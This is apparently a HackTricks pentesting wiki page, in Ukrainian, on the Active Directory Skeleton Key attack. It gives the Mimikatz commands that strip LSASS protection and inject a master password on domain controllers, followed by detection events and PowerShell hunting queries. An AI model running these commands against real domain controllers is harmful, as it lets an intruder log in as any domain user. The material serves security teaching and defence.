# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

**Skeleton Key attack** — це техніка, яка дає змогу attackers **обійти автентифікацію Active Directory**, **впровадивши master password** у процес LSASS кожного domain controller. Після впровадження master password (за замовчуванням **`mimikatz`**) можна автентифікуватися як **будь-який domain user**, тоді як їхні справжні паролі продовжують працювати.<sup>[[1]](#references)[[2]](#references)</sup>

Ключові факти:

- Потрібні права **Domain Admin/SYSTEM + SeDebugPrivilege** на кожному DC; атаку потрібно **повторно застосовувати після кожного перезавантаження**.<sup>[[2]](#references)</sup>
- Патчить шляхи перевірки **NTLM** і **Kerberos RC4 (etype 0x17)**; realms, що використовують лише AES, або облікові записи, для яких обов’язковий AES, **не прийматимуть skeleton key**.<sup>[[2]]</sup>
- Може конфліктувати зі сторонніми LSA authentication packages або додатковими smart-card / MFA providers.<sup>[[2]](#references)</sup>
- Модуль Mimikatz приймає необов’язковий switch `/letaes`, щоб не змінювати Kerberos/AES hooks у разі проблем із сумісністю.<sup>[[3]](#references)</sup>

### Execution

Класичний LSASS без захисту PPL:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Якщо **LSASS працює як PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), для зняття захисту перед внесенням змін до LSASS потрібен драйвер ядра:<sup>[[3]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Після ін'єкції автентифікуйтеся за допомогою будь-якого доменного облікового запису, але використайте пароль `mimikatz` (або значення, задане оператором). Не забудьте повторити це на **всіх DCs** у середовищах із кількома DCs.

## Заходи протидії

- **Моніторинг журналів**
- Системна подія **Event ID 7045** (встановлення служби/драйвера) для непідписаних драйверів, таких як `mimidrv.sys`.
- **Sysmon**: Event ID 7 (завантаження драйвера) для `mimidrv.sys`; Event ID 10 для підозрілого доступу до `lsass.exe` із боку процесів, що не належать до системних.
- Події безпеки **Event ID 4673/4611** для використання конфіденційних привілеїв або аномалій реєстрації пакетів автентифікації LSA; зіставляйте їх із неочікуваними входами 4624 із використанням RC4 (etype 0x17) від DCs.
- **Посилення захисту LSASS**
- Не вимикайте **RunAsPPL/Credential Guard/Secure LSASS** на DCs, щоб змусити атакувальників розгортати драйвери в режимі ядра (більше телеметрії, складніша експлуатація).
- За можливості вимкніть застарілий **RC4**; квитки Kerberos, обмежені AES, унеможливлюють шлях перехоплення RC4, який використовує skeleton key.<sup>[[2]](#references)</sup>
- Швидкі пошуки PowerShell:
- Виявлення встановлення непідписаних драйверів ядра: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Пошук драйвера Mimikatz: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Перевірка примусового застосування PPL після перезавантаження: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Додаткові рекомендації щодо посилення захисту облікових даних див. у [засобах захисту облікових даних Windows](../stealing-credentials/credentials-protections.md).

## Посилання

- [1] [Netwrix – атака Skeleton Key в Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – модуль Mimikatz misc::skeleton](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
